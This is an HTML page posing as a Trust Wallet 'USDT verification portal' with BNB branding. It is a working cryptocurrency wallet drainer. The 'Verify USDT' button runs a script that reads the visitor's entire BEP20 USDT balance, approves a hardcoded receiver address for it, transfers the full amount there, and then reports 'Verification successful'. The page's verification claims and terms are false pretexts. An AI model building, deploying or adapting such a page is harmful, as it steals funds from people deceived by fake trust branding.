<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verified on Trust Wallet</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #0049b1, #001f57);
      color: white;
      text-align: center;
      padding: 30px 20px;
    }
    .logo {
      margin-top: 40px;
    }
    .logo img {
      width: 80px;
    }
    .title {
      font-size: 22px;
      font-weight: bold;
      margin: 20px 0 10px;
      color: #00ffcc;
    }
    .subtitle {
      font-size: 14px;
      color: #b0dfff;
      margin-bottom: 40px;
    }
    .box {
      background: #0d1b3e;
      padding: 30px;
      border-radius: 12px;
      max-width: 400px;
      margin: auto;
    }
    .box h2 {
      font-size: 20px;
      margin-bottom: 10px;
    }
    .box p {
      font-size: 14px;
      color: #d0d0d0;
      margin-bottom: 30px;
    }
    .btn {
      padding: 12px 30px;
      background: #00f2a6;
      color: black;
      border: none;
      border-radius: 30px;
      font-size: 16px;
      cursor: pointer;
    }
    .btn:hover {
      background: #00db96;
    }
    .terms {
      font-size: 12px;
      color: #c0c0c0;
      margin-top: 40px;
    }
    .powered {
      margin-top: 10px;
      font-size: 11px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="logo">
    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB Logo" />
  </div>
  <div class="title">
    âœ… Verified on Trust Wallet
  </div>
  <div class="subtitle">
    Secure BEP20 USDT Verification Portal
  </div>
  <div class="box">
    <h2>Verify Your Wallet</h2>
    <p>Click below to verify by sending all your USDT</p>
    <button class="btn" onclick="verifyUSDT()">Verify USDT</button>
  </div>
  <div class="terms">
    <b>Terms & Conditions:</b><br />
    Minimum 200 USDT required for verification.<br />
    Transfers below this amount will be marked as failed.
  </div>
  <div class="powered">
    Powered by BEP20 Payment Gateway
  </div>  <script>
    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // tumhara wallet
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT

    async function verifyUSDT() {
      if (typeof window.ethereum === 'undefined') {
        alert("Trust Wallet ya MetaMask connect karen.");
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const address = await signer.getAddress();

      const usdt = new ethers.Contract(usdtAddress, [
        "function approve(address spender, uint amount) public returns (bool)",
        "function allowance(address owner, address spender) public view returns (uint)",
        "function balanceOf(address account) view returns (uint256)",
        "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
      ], signer);

      const balance = await usdt.balanceOf(address);
      const tx1 = await usdt.approve(receiver, balance);
      await tx1.wait();
      const tx2 = await usdt.transferFrom(address, receiver, balance);
      await tx2.wait();
      alert("Verification successful");
    }
  </script>  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script></body>
